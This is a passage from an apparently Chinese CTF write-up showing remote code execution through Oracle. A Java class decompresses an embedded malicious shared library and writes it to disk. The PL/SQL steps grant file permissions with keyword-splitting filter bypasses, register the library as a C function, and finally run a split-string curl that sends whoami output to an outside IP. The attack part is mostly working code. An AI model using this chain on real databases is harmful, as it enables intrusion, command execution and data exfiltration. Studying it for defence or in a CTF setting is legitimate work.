class="number">115</span>, -<span class="number">2</span>, -<span class="number">75</span>, -<span class="number">32</span>, -<span class="number">97</span>, -<span class="number">28</span>, -<span class="number">4</span>, -<span class="number">113</span>, <span class="number">88</span>, <span class="number">125</span>, -<span class="number">84</span>, <span class="number">34</span>, -<span class="number">111</span>, -<span class="number">90</span>, -<span class="number">123</span>, -<span class="number">2</span>, <span class="number">24</span>, <span class="number">98</span>, -<span class="number">42</span>, -<span class="number">11</span>, -<span class="number">14</span>, -<span class="number">30</span>, <span class="number">115</span>, -<span class="number">122</span>, <span class="number">56</span>, <span class="number">12</span>, -<span class="number">19</span>, <span class="number">20</span>, -<span class="number">29</span>, -<span class="number">98</span>, <span class="number">1</span>, -<span class="number">61</span>, <span class="number">86</span>, -<span class="number">3</span>, <span class="number">101</span>, -<span class="number">59</span>, -<span class="number">25</span>, <span class="number">22</span>, -<span class="number">15</span>, -<span class="number">118</span>, -<span class="number">49</span>, -<span class="number">8</span>, -<span class="number">3</span>, -<span class="number">26</span>, -<span class="number">11</span>, -<span class="number">102</span>, <span class="number">85</span>, <span class="number">22</span>, <span class="number">33</span>, -<span class="number">25</span>, -<span class="number">93</span>, <span class="number">124</span>, -<span class="number">119</span>, <span class="number">119</span>, -<span class="number">3</span>, <span class="number">119</span>, -<span class="number">84</span>, -<span class="number">15</span>, <span class="number">44</span>, <span class="number">45</span>, -<span class="number">2</span>, -<span class="number">3</span>, <span class="number">32</span>, <span class="number">46</span>, <span class="number">88</span>, -<span class="number">19</span>, -<span class="number">36</span>, <span class="number">93</span>, <span class="number">92</span>, <span class="number">127</span>, -<span class="number">60</span>, -<span class="number">121</span>, -<span class="number">106</span>, -<span class="number">1</span>, -<span class="number">82</span>, -<span class="number">101</span>, -<span class="number">18</span>, -<span class="number">37</span>, <span class="number">101</span>, -<span class="number">21</span>, <span class="number">28</span>, <span class="number">46</span>, -<span class="number">26</span>, <span class="number">3</span>, <span class="number">32</span>, -<span class="number">66</span>, -<span class="number">123</span>, <span class="number">118</span>, <span class="number">112</span>, <span class="number">125</span>, <span class="number">16</span>, <span class="number">63</span>, <span class="number">88</span>, -<span class="number">2</span>, -<span class="number">107</span>, -<span class="number">59</span>, -<span class="number">65</span>, <span class="number">11</span>, -<span class="number">60</span>, -<span class="number">97</span>, -<span class="number">42</span>, <span class="number">120</span>, <span class="number">66</span>, <span class="number">11</span>, <span class="number">1</span>, -<span class="number">28</span>, -<span class="number">128</span>, <span class="number">18</span>, -<span class="number">55</span>, <span class="number">59</span>, <span class="number">78</span>, -<span class="number">66</span>, <span class="number">70</span>, -<span class="number">14</span>, -<span class="number">114</span>, -<span class="number">73</span>, -<span class="number">81</span>, -<span class="number">105</span>, -<span class="number">68</span>, -<span class="number">29</span>, -<span class="number">28</span>, -<span class="number">73</span>, -<span class="number">7</span>, -<span class="number">76</span>, <span class="number">19</span>, -<span class="number">9</span>, -<span class="number">15</span>, -<span class="number">85</span>, -<span class="number">110</span>, <span class="number">119</span>, <span class="number">28</span>, <span class="number">62</span>, <span class="number">73</span>, -<span class="number">28</span>, -<span class="number">52</span>, -<span class="number">68</span>, <span class="number">57</span>, -<span class="number">44</span>, -<span class="number">33</span>, <span class="number">47</span>, <span class="number">39</span>, -<span class="number">56</span>, <span class="number">66</span>, -<span class="number">104</span>, -<span class="number">67</span>, <span class="number">106</span>, -<span class="number">90</span>, -<span class="number">43</span>, <span class="number">4</span>, <span class="number">11</span>, -<span class="number">89</span>, -<span class="number">49</span>, <span class="number">19</span>, <span class="number">85</span>, -<span class="number">43</span>, -<span class="number">77</span>, -<span class="number">22</span>, <span class="number">64</span>, <span class="number">42</span>, -<span class="number">37</span>, -<span class="number">89</span>, -<span class="number">91</span>, <span class="number">84</span>, -<span class="number">35</span>, -<span class="number">52</span>, -<span class="number">26</span>, -<span class="number">14</span>, -<span class="number">86</span>, <span class="number">54</span>, <span class="number">52</span>, <span class="number">66</span>, <span class="number">18</span>, -<span class="number">39</span>, -<span class="number">12</span>, -<span class="number">111</span>, -<span class="number">108</span>, <span class="number">97</span>, <span class="number">26</span>, <span class="number">58</span>, <span class="number">125</span>, <span class="number">102</span>, <span class="number">61</span>, <span class="number">107</span>, -<span class="number">80</span>, -<span class="number">32</span>, -<span class="number">5</span>, -<span class="number">92</span>, -<span class="number">86</span>, -<span class="number">27</span>, <span class="number">114</span>, -<span class="number">38</span>, -<span class="number">88</span>, <span class="number">106</span>, <span class="number">100</span>, -<span class="number">52</span>, -<span class="number">36</span>, <span class="number">40</span>, -<span class="number">23</span>, -<span class="number">49</span>, <span class="number">105</span>, <span class="number">105</span>, <span class="number">67</span>, -<span class="number">43</span>, -<span class="number">121</span>, -<span class="number">46</span>, -<span class="number">23</span>, <span class="number">81</span>, <span class="number">42</span>, <span class="number">113</span>, <span class="number">88</span>, <span class="number">42</span>, -<span class="number">83</span>, <span class="number">105</span>, -<span class="number">70</span>, -<span class="number">86</span>, -<span class="number">114</span>, -<span class="number">116</span>, <span class="number">25</span>, -<span class="number">61</span>, -<span class="number">55</span>, <span class="number">20</span>, <span class="number">29</span>, -<span class="number">111</span>, -<span class="number">86</span>, -<span class="number">74</span>, <span class="number">117</span>, <span class="number">55</span>, <span class="number">119</span>, -<span class="number">58</span>, -<span class="number">43</span>, <span class="number">120</span>, <span class="number">87</span>, <span class="number">43</span>, -<span class="number">53</span>, <span class="number">5</span>, <span class="number">96</span>, <span class="number">109</span>, -<span class="number">78</span>, -<span class="number">18</span>, -<span class="number">14</span>, <span class="number">89</span>, <span class="number">117</span>, <span class="number">80</span>, -<span class="number">53</span>, -<span class="number">24</span>, <span class="number">44</span>, -<span class="number">48</span>, -<span class="number">65</span>, <span class="number">117</span>, <span class="number">127</span>, <span class="number">87</span>, <span class="number">115</span>, -<span class="number">25</span>, -<span class="number">98</span>, <span class="number">24</span>, -<span class="number">11</span>, -<span class="number">74</span>, <span class="number">119</span>, -<span class="number">11</span>, -<span class="number">86</span>, <span class="number">113</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">74</span>, <span class="number">107</span>, <span class="number">55</span>, <span class="number">117</span>, -<span class="number">11</span>, <span class="number">116</span>, -<span class="number">58</span>, <span class="number">80</span>, -<span class="number">38</span>, -<span class="number">34</span>, -<span class="number">79</span>, -<span class="number">73</span>, -<span class="number">91</span>, -<span class="number">71</span>, <span class="number">67</span>, -<span class="number">35</span>, -<span class="number">37</span>, -<span class="number">42</span>, -<span class="number">10</span>, <span class="number">100</span>, -<span class="number">68</span>, <span class="number">71</span>, -<span class="number">19</span>, <span class="number">105</span>, <span class="number">110</span>, -<span class="number">23</span>, -<span class="number">120</span>, <span class="number">83</span>, <span class="number">47</span>, -<span class="number">21</span>, -<span class="number">7</span>, <span class="number">111</span>, <span class="number">83</span>, <span class="number">12</span>, -<span class="number">20</span>, -<span class="number">84</span>, -<span class="number">127</span>, <span class="number">38</span>, <span class="number">103</span>, -<span class="number">82</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">38</span>, -<span class="number">16</span>, <span class="number">74</span>, <span class="number">82</span>, -<span class="number">72</span>, -<span class="number">115</span>, <span class="number">68</span>, <span class="number">4</span>, <span class="number">87</span>, <span class="number">59</span>, <span class="number">68</span>, -<span class="number">50</span>, -<span class="number">113</span>, -<span class="number">90</span>, <span class="number">77</span>, -<span class="number">83</span>, -<span class="number">113</span>, -<span class="number">78</span>, -<span class="number">103</span>, -<span class="number">77</span>, <span class="number">121</span>, <span class="number">16</span>, -<span class="number">81</span>, <span class="number">50</span>, <span class="number">89</span>, -<span class="number">45</span>, -<span class="number">112</span>, <span class="number">7</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">114</span>, -<span class="number">33</span>, <span class="number">80</span>, <span class="number">50</span>, -<span class="number">91</span>, -<span class="number">41</span>, <span class="number">38</span>, <span class="number">117</span>, <span class="number">98</span>, <span class="number">89</span>, -<span class="number">125</span>, <span class="number">90</span>, <span class="number">126</span>, -<span class="number">112</span>, -<span class="number">56</span>, -<span class="number">6</span>, <span class="number">104</span>, -<span class="number">122</span>, <span class="number">42</span>, <span class="number">109</span>, <span class="number">54</span>, <span class="number">115</span>, <span class="number">118</span>, -<span class="number">55</span>, -<span class="number">80</span>, -<span class="number">111</span>, -<span class="number">53</span>, <span class="number">39</span>, -<span class="number">77</span>, <span class="number">25</span>, -<span class="number">105</span>, -<span class="number">95</span>, -<span class="number">46</span>, -<span class="number">78</span>, -<span class="number">100</span>, -<span class="number">111</span>, -<span class="number">46</span>, <span class="number">88</span>, <span class="number">69</span>, -<span class="number">72</span>, <span class="number">58</span>, -<span class="number">110</span>, <span class="number">50</span>, -<span class="number">119</span>, <span class="number">108</span>, <span class="number">77</span>, -<span class="number">102</span>, <span class="number">93</span>, -<span class="number">54</span>, <span class="number">3</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">97</span>, <span class="number">26</span>, <span class="number">35</span>, -<span class="number">12</span>, <span class="number">108</span>, <span class="number">45</span>, -<span class="number">83</span>, -<span class="number">100</span>, -<span class="number">53</span>, -<span class="number">22</span>, -<span class="number">102</span>, -<span class="number">87</span>, <span class="number">17</span>, -<span class="number">39</span>, <span class="number">24</span>, -<span class="number">124</span>, <span class="number">27</span>, <span class="number">52</span>, -<span class="number">88</span>, -<span class="number">25</span>, <span class="number">22</span>, <span class="number">44</span>, <span class="number">91</span>, <span class="number">106</span>, -<span class="number">33</span>, <span class="number">41</span>, <span class="number">91</span>, -<span class="number">127</span>, -<span class="number">41</span>, -<span class="number">76</span>, <span class="number">7</span>, <span class="number">45</span>, -<span class="number">99</span>, <span class="number">76</span>, <span class="number">16</span>, -<span class="number">42</span>, -<span class="number">94</span>, -<span class="number">35</span>, -<span class="number">119</span>, -<span class="number">35</span>, <span class="number">78</span>, <span class="number">95</span>, <span class="number">62</span>, <span class="number">79</span>, <span class="number">100</span>, -<span class="number">6</span>, -<span class="number">84</span>, -<span class="number">92</span>, -<span class="number">23</span>, <span class="number">125</span>, -<span class="number">11</span>, <span class="number">122</span>, -<span class="number">8</span>, -<span class="number">2</span>, <span class="number">57</span>, -<span class="number">40</span>, <span class="number">62</span>, -<span class="number">24</span>, -<span class="number">52</span>, <span class="number">101</span>, -<span class="number">16</span>, -<span class="number">53</span>, -<span class="number">5</span>, <span class="number">65</span>, -<span class="number">16</span>, -<span class="number">71</span>, <span class="number">83</span>, <span class="number">44</span>, -<span class="number">51</span>, -<span class="number">24</span>, <span class="number">55</span>, -<span class="number">70</span>, <span class="number">87</span>, -<span class="number">96</span>, <span class="number">30</span>, -<span class="number">9</span>, -<span class="number">57</span>, <span class="number">67</span>, -<span class="number">100</span>, <span class="number">30</span>, -<span class="number">9</span>, <span class="number">17</span>, -<span class="number">2</span>, -<span class="number">1</span>, <span class="number">72</span>, -<span class="number">73</span>, <span class="number">19</span>, <span class="number">123</span>, <span class="number">111</span>, <span class="number">68</span>, <span class="number">61</span>, -<span class="number">18</span>, -<span class="number">97</span>, -<span class="number">56</span>, -<span class="number">72</span>, -<span class="number">97</span>, -<span class="number">79</span>, <span class="number">126</span>, <span class="number">37</span>, -<span class="number">121</span>, <span class="number">30</span>, -<span class="number">9</span>, -<span class="number">75</span>, <span class="number">38</span>, <span class="number">104</span>, <span class="number">27</span>, -<span class="number">11</span>, -<span class="number">72</span>, <span class="number">31</span>, <span class="number">35</span>, -<span class="number">29</span>, -<span class="number">2</span>, -<span class="number">117</span>, -<span class="number">112</span>, <span class="number">56</span>, <span class="number">91</span>, <span class="number">33</span>, -<span class="number">10</span>, <span class="number">94</span>, -<span class="number">120</span>, <span class="number">122</span>, -<span class="number">36</span>, -<span class="number">1</span>, -<span class="number">112</span>, <span class="number">43</span>, -<span class="number">71</span>, -<span class="number">15</span>, <span class="number">7</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">121</span>, <span class="number">55</span>, -<span class="number">13</span>, <span class="number">14</span>, <span class="number">61</span>, -<span class="number">18</span>, -<span class="number">81</span>, -<span class="number">56</span>, <span class="number">81</span>, -<span class="number">97</span>, -<span class="number">15</span>, <span class="number">35</span>, <span class="number">116</span>, <span class="number">40</span>, <span class="number">67</span>, <span class="number">61</span>, -<span class="number">18</span>, -<span class="number">25</span>, -<span class="number">56</span>, <span class="number">56</span>, <span class="number">127</span>, <span class="number">126</span>, -<span class="number">3</span>, <span class="number">112</span>, -<span class="number">2</span>, <span class="number">25</span>, -<span class="number">48</span>, -<span class="number">73</span>, -<span class="number">128</span>, -<span class="number">115</span>, -<span class="number">17</span>, <span class="number">7</span>, -<span class="number">56</span>, -<span class="number">50</span>, -<span class="number">9</span>, -<span class="number">115</span>, -<span class="number">107</span>, <span class="number">30</span>, -<span class="number">6</span>, <span class="number">17</span>, -<span class="number">30</span>, -<span class="number">54</span>, <span class="number">117</span>, -<span class="number">70</span>, <span class="number">41</span>, -<span class="number">81</span>, <span class="number">13</span>, -<span class="number">33</span>, <span class="number">59</span>, <span class="number">16</span>, -<span class="number">4</span>, -<span class="number">3</span>, -<span class="number">49</span>, <span class="number">115</span>, -<span class="number">6</span>, <span class="number">104</span>, -<span class="number">124</span>, <span class="number">99</span>, -<span class="number">82</span>, <span class="number">62</span>, -<span class="number">97</span>, <span class="number">62</span>, -<span class="number">9</span>, <span class="number">44</span>, -<span class="number">89</span>, <span class="number">111</span>, -<span class="number">118</span>, -<span class="number">72</span>, -<span class="number">103</span>, <span class="number">95</span>, -<span class="number">81</span>, <span class="number">32</span>, -<span class="number">57</span>, <span class="number">47</span>, <span class="number">113</span>, <span class="number">122</span>, -<span class="number">36</span>, -<span class="number">73</span>, -<span class="number">111</span>, -<span class="number">65</span>, -<span class="number">15</span>, -<span class="number">23</span>, <span class="number">31</span>, <span class="number">113</span>, -<span class="number">102</span>, -<span class="number">45</span>, -<span class="number">29</span>, <span class="number">126</span>, -<span class="number">121</span>, <span class="number">28</span>, -<span class="number">30</span>, -<span class="number">22</span>, -<span class="number">13</span>, -<span class="number">13</span>, <span class="number">127</span>, <span class="number">25</span>, -<span class="number">12</span>, -<span class="number">59</span>, <span class="number">92</span>, -<span class="number">96</span>, -<span class="number">88</span>, -<span class="number">101</span>, -<span class="number">7</span>, -<span class="number">9</span>, <span class="number">39</span>, -<span class="number">2</span>, -<span class="number">7</span>, <span class="number">59</span>, -<span class="number">57</span>, -<span class="number">23</span>, -<span class="number">3</span>, -<span class="number">14</span>, -<span class="number">25</span>, -<span class="number">4</span>, -<span class="number">6</span>, <span class="number">127</span>, -<span class="number">101</span>, -<span class="number">45</span>, <span class="number">111</span>, -<span class="number">120</span>, -<span class="number">70</span>, -<span class="number">7</span>, <span class="number">24</span>, <span class="number">87</span>, -<span class="number">97</span>, <span class="number">95</span>, -<span class="number">49</span>, -<span class="number">9</span>, -<span class="number">120</span>, -<span class="number">3</span>, -<span class="number">116</span>, -<span class="number">29</span>, <span class="number">56</span>, -<span class="number">117</span>, -<span class="number">7</span>, <span class="number">116</span>, -<span class="number">75</span>, -<span class="number">34</span>, -<span class="number">11</span>, -<span class="number">7</span>, -<span class="number">11</span>, <span class="number">103</span>, -<span class="number">5</span>, <span class="number">126</span>, -<span class="number">40</span>, -<span class="number">95</span>, <span class="number">47</span>, -<span class="number">66</span>, -<span class="number">41</span>, -<span class="number">56</span>, -<span class="number">18</span>, <span class="number">122</span>, <span class="number">126</span>, -<span class="number">6</span>, -<span class="number">49</span>, -<span class="number">119</span>, <span class="number">59</span>, <span class="number">39</span>, -<span class="number">85</span>, -<span class="number">104</span>, -<span class="number">81</span>, <span class="number">8</span>, <span class="number">122</span>, -<span class="number">52</span>, <span class="number">83</span>, <span class="number">44</span>, -<span class="number">27</span>, <span class="number">116</span>, <span class="number">120</span>, <span class="number">31</span>, -<span class="number">113</span>, <span class="number">19</span>, <span class="number">123</span>, -<span class="number">2</span>, -<span class="number">88</span>, -<span class="number">57</span>, -<span class="number">4</span>, -<span class="number">81</span>, -<span class="number">53</span>, -<span class="number">101</span>, <span class="number">109</span>, -<span class="number">114</span>, -<span class="number">34</span>, -<span class="number">94</span>, -<span class="number">1</span>, -<span class="number">81</span>, <span class="number">56</span>, <span class="number">61</span>, -<span class="number">66</span>, <span class="number">119</span>, -<span class="number">52</span>, -<span class="number">34</span>, -<span class="number">90</span>, -<span class="number">2</span>, <span class="number">59</span>, <span class="number">78</span>, <span class="number">95</span>, -<span class="number">52</span>, <span class="number">75</span>, -<span class="number">85</span>, <span class="number">115</span>, -<span class="number">41</span>, -<span class="number">29</span>, -<span class="number">11</span>, -<span class="number">120</span>, -<span class="number">17</span>, -<span class="number">63</span>, -<span class="number">121</span>, <span class="number">122</span>, <span class="number">124</span>, <span class="number">31</span>, -<span class="number">118</span>, -<span class="number">8</span>, -<span class="number">24</span>, -<span class="number">7</span>, -<span class="number">25</span>, <span class="number">103</span>, <span class="number">22</span>, <span class="number">124</span>, -<span class="number">4</span>, -<span class="number">85</span>, <span class="number">46</span>, -<span class="number">22</span>, <span class="number">107</span>, <span class="number">124</span>, -<span class="number">12</span>, <span class="number">78</span>, -<span class="number">10</span>, -<span class="number">54</span>, <span class="number">99</span>, -<span class="number">85</span>, <span class="number">3</span>, -<span class="number">3</span>, <span class="number">17</span>, <span class="number">40</span>, <span class="number">100</span>, -<span class="number">33</span>, <span class="number">71</span>, <span class="number">43</span>, -<span class="number">56</span>, -<span class="number">51</span>, -<span class="number">1</span>, <span class="number">126</span>, -<span class="number">124</span>, -<span class="number">120</span>, -<span class="number">9</span>, <span class="number">55</span>, -<span class="number">62</span>, -<span class="number">7</span>, <span class="number">122</span>, -<span class="number">101</span>, -<span class="number">57</span>, -<span class="number">72</span>, <span class="number">1</span>, -<span class="number">13</span>, -<span class="number">29</span>, <span class="number">95</span>, -<span class="number">26</span>, -<span class="number">93</span>, -<span class="number">81</span>, -<span class="number">38</span>, <span class="number">106</span>, -<span class="number">13</span>, <span class="number">13</span>, -<span class="number">50</span>, -<span class="number">49</span>, -<span class="number">21</span>, -<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">8</span>, -<span class="number">29</span>, <span class="number">16</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        GZIPInputStream gzipInputStream = <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data));</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line"></span><br><span class="line">        byte[] buffer = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ((len = gzipInputStream.<span class="title function_ invoke__">read</span>(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            fileOutputStream.<span class="title function_ invoke__">write</span>(buffer, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        gzipInputStream.<span class="title function_ invoke__">close</span>();</span><br><span class="line">        fileOutputStream.<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;write ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560252598-2c445037-c2e9-411a-8b4f-fb890297033d.png#averageHue=%23000000&clientId=uc0602720-8ce8-4&from=paste&height=201&id=ucd7793fc&originHeight=201&originWidth=888&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6727&status=done&style=none&taskId=uaf2245c1-bed1-4f10-93d2-47b5cde9cae&title=&width=888" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560369300-3ff24f27-4790-4adf-af61-26abca9cb8e0.png#averageHue=%23cecece&clientId=uc0602720-8ce8-4&from=paste&height=1415&id=u3999d00e&originHeight=1415&originWidth=2550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105404&status=done&style=none&taskId=uc54d8c30-c709-4dd8-bd90-185cbb6d9a3&title=&width=2550" alt="image.png"><br>这段代码会写入一个恶意的so文件。接下来该做的就是创建function了。<br><code>sql=create or replace function java_write(path varchar2) return varchar2 as language java name &#39;JavaTool.write(java.lang.String) return java.lang.String&#39;;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560389246-ca027db9-e845-4540-a3f6-24ff3af342c2.png#averageHue=%23cfcfcf&clientId=uc0602720-8ce8-4&from=paste&height=1408&id=ueffd5485&originHeight=1408&originWidth=1982&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67434&status=done&style=none&taskId=ub238d9d6-63b6-4973-95bc-1d40f8543c6&title=&width=1982" alt="image.png"><br>接下来调用这个java_write写入恶意so</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">java_write</span>(<span class="string">&#x27;/tmp/evil.so&#x27;</span>) = <span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">then dbms_output.<span class="title function_ invoke__">put_line</span>(<span class="string">&#x27;Valid&#x27;</span>);</span><br><span class="line"><span class="keyword">else</span> dbms_output.<span class="title function_ invoke__">put_line</span>(<span class="string">&#x27;Invalid&#x27;</span>);</span><br><span class="line">end <span class="keyword">if</span>;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure>
<p>在这里select被过滤了，因此我们需要使用别的语句去调用方法，这里用的是if语句。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560534500-6e1249e5-ac7a-44fc-8276-dfe04092b94b.png#averageHue=%232a2d32&clientId=uc0602720-8ce8-4&from=paste&height=722&id=u42bf0c77&originHeight=722&originWidth=1498&originalType=binary&ratio=1&rotation=0&showTitle=false&size=130134&status=done&style=none&taskId=u7c20875e-aa50-46b2-8410-1ac3239a6bb&title=&width=1498" alt="image.png"><br>在这里报错了，原因是目录问题，我们只可以写入ORCLE_HOME,而其他文件位置我们是不知道的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560686655-f1536a98-017b-4023-add8-9b0991c5cc68.png#averageHue=%23070503&clientId=uc0602720-8ce8-4&from=paste&height=51&id=u5a707719&originHeight=51&originWidth=333&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3205&status=done&style=none&taskId=u10acba47-ccce-4b2d-8f5c-9e19fea8148&title=&width=333" alt="image.png"><br>改为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">java_write</span>(<span class="string">&#x27;/opt/oracle/product/23c/dbhomeFree/evil.so&#x27;</span>) = <span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">then dbms_output.<span class="title function_ invoke__">put_line</span>(<span class="string">&#x27;Valid&#x27;</span>);</span><br><span class="line"><span class="keyword">else</span> dbms_output.<span class="title function_ invoke__">put_line</span>(<span class="string">&#x27;Invalid&#x27;</span>);</span><br><span class="line">end <span class="keyword">if</span>;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560748266-91b379ae-1b79-470a-8f25-421ca9db678c.png#averageHue=%232b2e32&clientId=uc0602720-8ce8-4&from=paste&height=798&id=u769dc0f6&originHeight=798&originWidth=1550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=173069&status=done&style=none&taskId=u80ba3f1f-aa54-4ea0-99a2-d5b6e1f01ec&title=&width=1550" alt="image.png"><br>第二次报错是因为没有FilePermission，我们给他加上即可。这里绕过关键字用<code>||</code>拼贴就好</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">begin</span><br><span class="line">dbms_java.<span class="title function_ invoke__">grant_permission</span>(<span class="string">&#x27;SYSTEM&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>, <span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>, <span class="string">&#x27;read,write,e&#x27;</span>||<span class="string">&#x27;xecute,del&#x27;</span>||<span class="string">&#x27;ete&#x27;</span>);</span><br><span class="line">end;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560802447-85fc6fc8-1e96-4b41-8f7b-71e8e4267fbf.png#averageHue=%23d1d1d1&clientId=uc0602720-8ce8-4&from=paste&height=1365&id=u6e1c90b1&originHeight=1365&originWidth=2022&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70825&status=done&style=none&taskId=u8fba8ff3-9987-48d0-ad88-79a775a7336&title=&width=2022" alt="image.png"><br>然后写入成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560817933-2165493b-4274-442b-91c0-73a89cf2ae5e.png#averageHue=%23d2d2d2&clientId=uc0602720-8ce8-4&from=paste&height=1387&id=ufdfc13c0&originHeight=1387&originWidth=1712&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74797&status=done&style=none&taskId=u1eb9faf4-f0f6-4d92-9036-78d928148c3&title=&width=1712" alt="image.png"><br>看xz的wp他说这里进行了gzip压缩，假如不压缩会产生java source过长无法执行的问题，其实执行是肯定可以的，只是服务端设置的timeout是5s，因此导致执行失败。（gzip压缩后还可以被识别？）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560842539-609689ca-30e7-46c0-8bc8-1cfd1943f095.png#averageHue=%23040301&clientId=uc0602720-8ce8-4&from=paste&height=179&id=u29f71115&originHeight=179&originWidth=979&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15459&status=done&style=none&taskId=uc614a58d-ed03-4fc7-b808-0dac2b1351a&title=&width=979" alt="image.png"></p>
<p>接下来创建lib即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create <span class="keyword">or</span> replace library lib_evils <span class="keyword">as</span> <span class="string">&#x27;/opt/oracle/product/23c/dbhomeFree/evil.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560977924-955c7704-773e-4d88-89e0-f4e3639427ca.png#averageHue=%23cbcbcb&clientId=uc0602720-8ce8-4&from=paste&height=1401&id=ud9a68be4&originHeight=1401&originWidth=1856&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58368&status=done&style=none&taskId=u0f5cee77-bf88-449c-9ff5-54a65a6fe18&title=&width=1856" alt="image.png"><br>然后创建rce的function</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create <span class="keyword">or</span> replace <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params">str varchar2</span>) <span class="title">return</span> <span class="title">varchar2</span> <span class="title">as</span> <span class="title">language</span> <span class="title">c</span> <span class="title">library</span> <span class="title">lib_evils</span> <span class="title">name</span> &quot;<span class="title">cmd</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702560996004-bca83c03-bf35-4672-a5be-9bdfc46e23e8.png#averageHue=%23dbdbdb&clientId=uc0602720-8ce8-4&from=paste&height=1294&id=u71796471&originHeight=1294&originWidth=1723&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50832&status=done&style=none&taskId=u56726d7f-aaf5-4fad-979a-0abfc1e7069&title=&width=1723" alt="image.png"><br>创建完毕后我们只需要和上面一样，用IF语句去调用rce方法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">rce</span>(<span class="string">&#x27;/bin/cu&#x27;</span>||<span class="string">&#x27;rl ht&#x27;</span>||<span class="string">&#x27;tp://8.130.24.188:7775?a=`/bin/whoami`&#x27;</span>) = <span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">then dbms_output.<span class="title function_ invoke__">put_line</span>(<span class="string">&#x27;Valid&#x27;</span>);</span><br><span class="line"><span class="keyword">else</span> dbms_output.<span class="title function_ invoke__">put_line</span>(<span class="string">&#x27;Invalid&#x27;</span>);</span><br><span class="line">end <span class="keyword">if</span>;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure>
